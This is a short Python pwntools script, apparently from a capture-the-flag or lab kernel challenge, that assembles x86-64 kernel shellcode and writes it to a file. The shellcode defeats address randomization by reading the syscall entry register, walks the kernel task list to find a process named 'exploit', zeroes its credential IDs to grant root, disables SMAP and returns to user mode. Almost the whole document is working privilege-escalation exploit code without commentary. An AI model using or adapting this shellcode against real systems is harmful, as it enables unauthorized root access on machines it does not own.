from pwn import *

context.arch = 'amd64'
off_pkc = 0x329b90 # prepare_kernel_cred
off_cc = 0x3298f0  # commit_cred
off_ic = 0x54c60 # init cred
off_srrarta = 0x15d0 # swapgs_restore_regs_and_return_to_usermode
off_win = 0x401a35
off_it = 0xe900
off_text_data = 0x1a00000


shellcode = asm(f''' 
    mov ecx, 0xC0000082                 # leak kaslr putting on lstar address of entry syscall
    rdmsr                               # this put on rdx lower 32 bits and in rax higher 32 bits
    shl rdx, 32             
    or rax, rdx             
    mov rdx, rax            
    sub rdx, 0x80
    mov r9, rdx           
                
    xor rsi, rsi 
                
    mov rsi, rdx                        # searching task->name                                     
    add rsi, 0x1a0e900                  # add off to text + init_task 
                
    loop:
        mov rcx, rsi
        add rcx, 0x778                  # 0x778 offset task->name
        mov r10, [rcx]
        mov rax, 0x0074696f6c707865     # string exploit
        cmp r10, rax
        je found_target
        sub rcx, 0x2b8                  # distance between task->name and next ptr
        mov rsi, [rcx]
        sub rsi, 0x4c0 
        jmp loop

    found_target:
        sub rcx, 0x778
        mov rax, rcx
        add rax, 0x760                  # offset cred
        mov rdi, [rax]
                
        mov qword ptr [rdi + 0x8], 0x0  # setting 0 uid guid ecc..
        mov qword ptr [rdi + 0xf], 0x0
        mov qword ptr [rdi + 0x18], 0x0
        mov qword ptr [rdi + 0x20], 0x0     
        
        stac                            # off smap
        mov rdi, 0x1337000              # setting up swapgs
        lea rsp, [rdi + 0x3000]  
        mov rax, [rdi]   
        push rax
        mov rax, [rdi + 8]
        push rax
        mov rax, [rdi + 24]
        push rax 
        mov rax, [rdi + 16]  
        push rax
        mov rax, [rdi + 32]  
        push rax
        mov rax, 0xdeadbeef
        push rax
        mov rax, 0xcafebabe
        push rax
                                
        mov rax, r9
        add rax, 0x1637
        jmp rax
        
        ret
                
    ret
''')

print(len(shellcode))
with open("shellcode.txt", "wb") as f:
    f.write(shellcode)
